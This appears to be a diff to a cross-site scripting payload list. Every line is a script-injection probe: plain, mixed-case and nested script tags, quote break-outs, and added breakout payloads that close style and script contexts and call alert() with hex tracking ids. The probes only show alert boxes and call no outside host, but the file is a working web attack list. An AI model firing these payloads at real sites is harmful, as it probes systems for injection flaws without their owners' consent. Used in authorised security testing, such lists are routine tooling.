@@ -1,29 +1,30 @@
+'"--></style></script><script>alert(0x00008E)</script>
 <script>alert(123);</script>
-
+'"--></style></script><script>alert(0x000098)</script>
 <ScRipT>alert(“XSS”);</ScRipT>
-
+'"--></style></script><script>alert(0x00018D)</script>
 <script>alert(123)</script>
-
+'"--></style></script><script>alert(0x0001CC)</script>
 <script>alert(“hellox worldss”);</script>
-
+'"--></style></script><script>alert(0x0001CE)</script>
 <script>alert(“XSS”)</script>
-
+'"--></style></script><script>alert(0x0001D7)</script>
 <script>alert(“XSS”);</script>
-
+'"--></style></script><script>alert(0x0001FD)</script>
 <script>alert(‘XSS’)</script>
-
+'"--></style></script><script>alert(0x00027F)</script>
 “><script>alert(“XSS”)</script>
-
+'"--></style></script><script>alert(0x0002CF)</script>
 <script>alert(/XSS”)</script>
-
+'"--></style></script><script>alert(0x00030C)</script>
 <script>alert(/XSS/)</script>
-
+'"--></style></script><script>alert(0x00035F)</script>
 </script><script>alert(1)</script>
-
+'"--></style></script><script>alert(0x000360)</script>
 <scr<object>ipt>alert(1)</script>
-
+'"--></style></script><script>alert(0x0003AF)</script>
 <scr<script>ipt>alert(1)</script>
-
+'"--></style></script><script>alert(0x0003C4)</script>
 <script><script>alert(1)</script>
 
 ‘; alert(1);
